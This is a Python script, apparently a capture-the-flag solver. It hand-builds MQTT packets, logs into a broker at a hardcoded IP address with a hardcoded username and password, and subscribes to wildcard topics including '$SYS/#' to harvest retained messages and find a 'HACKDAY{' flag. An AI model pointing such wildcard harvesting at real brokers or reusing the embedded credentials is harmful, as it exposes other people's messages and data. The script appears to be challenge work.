import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username: payload += struct.pack("!H", len(username)) + username.encode()
    if password: payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    return b'\x10' + bytes([rem_len]) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    return b'\x82' + bytes([rem_len]) + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("retained-hunter-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    # Let's try many wildcards
    topics = ["#", "/#", "+/#", "+/+/+", "+/+/+/+", "$SYS/#"]
    for i, t in enumerate(topics):
        s.sendall(mqtt_subscribe(t, 20000 + i))
    
    print("[*] Listening for retained messages...")
    start_time = time.time()
    all_data = b""
    try:
        while time.time() - start_time < 30:
            data = s.recv(8192)
            if not data: break
            all_data += data
            # Check for strings in the data
            current_decoded = all_data.decode(errors='ignore')
            if "HACKDAY{" in current_decoded:
                print(f"[!!!] FLAG FOUND: {current_decoded[current_decoded.find('HACKDAY{'):current_decoded.find('HACKDAY{')+100]}")
                break
    except: pass
    finally:
        s.close()
    
    # Try to extract topic/payload pairs from all_data
    print(f"[*] Total data received: {len(all_data)} bytes")
    i = 0
    found_topics = set()
    while i < len(all_data):
        if all_data[i] & 0xF0 == 0x30: # PUBLISH
            try:
                # Remaining length
                rl = all_data[i+1]
                offset = 2
                if rl & 0x80:
                    rl = (rl & 0x7F) + (all_data[i+2] << 7)
                    offset = 3
                
                topic_len = struct.unpack("!H", all_data[i+offset:i+offset+2])[0]
                topic = all_data[i+offset+2:i+offset+2+topic_len].decode(errors='ignore')
                payload = all_data[i+offset+2+topic_len:i+offset+rl].decode(errors='ignore')
                if topic not in found_topics:
                    print(f"  [T] {topic}: {payload[:50]}...")
                    found_topics.add(topic)
                i += offset + rl
            except:
                i += 1
        else:
            i += 1

if __name__ == "__main__":
    solve()
